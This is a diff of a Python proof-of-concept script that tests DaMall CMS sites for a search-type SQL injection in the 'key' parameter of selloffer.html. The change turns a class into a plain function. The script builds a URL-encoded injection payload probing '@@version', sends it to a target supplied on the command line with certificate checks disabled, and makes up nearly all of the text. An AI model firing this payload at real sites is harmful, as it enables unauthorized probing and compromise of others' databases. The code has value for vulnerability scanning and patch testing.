@@ -9,20 +9,13 @@ description: DaMall CMS文件selloffer.html?key参数存在搜索型SQL注入漏
 import sys
 import requests
 import warnings
-
-
-
-class damall_selloffer_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['DaMall商城系统sql注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/selloffer.html?key=%27AnD%20@@version=0%20or%27%%27=%27%"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
@@ -38,5 +31,4 @@ class damall_selloffer_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = damall_selloffer_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
